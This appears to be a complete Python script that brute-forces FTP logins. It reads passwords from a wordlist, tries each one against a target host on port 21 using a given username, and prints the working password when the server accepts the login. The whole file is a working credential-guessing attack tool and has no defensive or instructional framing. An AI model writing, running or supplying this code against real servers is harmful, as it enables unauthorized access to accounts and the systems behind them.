import socket

class BruteFTB():
    def __init__(self, host, user, wordlist):
        self.user = user
        self.host = host
        self.wordlist = wordlist
    
    def Checkout(self):
        
        with open(self.wordlist, "r") as wordlist:
            read = wordlist.readlines()
        
            for line in read:
                sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sc.connect((self.host, 21))
                sc.recv(1024)

                sc.send("USER {0}\r\n".format(self.user).encode())
                sc.recv(1024)
                sc.send("PASS {0}\r\n".format(line.strip()).encode())
                
                r = sc.recv(1024)
                sc.send("QUIT\r\n".encode())

                if u"230 Login successful" in str(r):
                    print("\n\n")
                    print("----------Successful----------")
                    print("Target: {0}".format(self.host))
                    print("Username: {0}".format(self.user))
                    print("Password: {0}".format(line.strip()))
                    print("------------------------------")
                    exit(0)
                else:            
                    print("User: {0} - Password: {1} - failed".format(self.user, line.strip()))
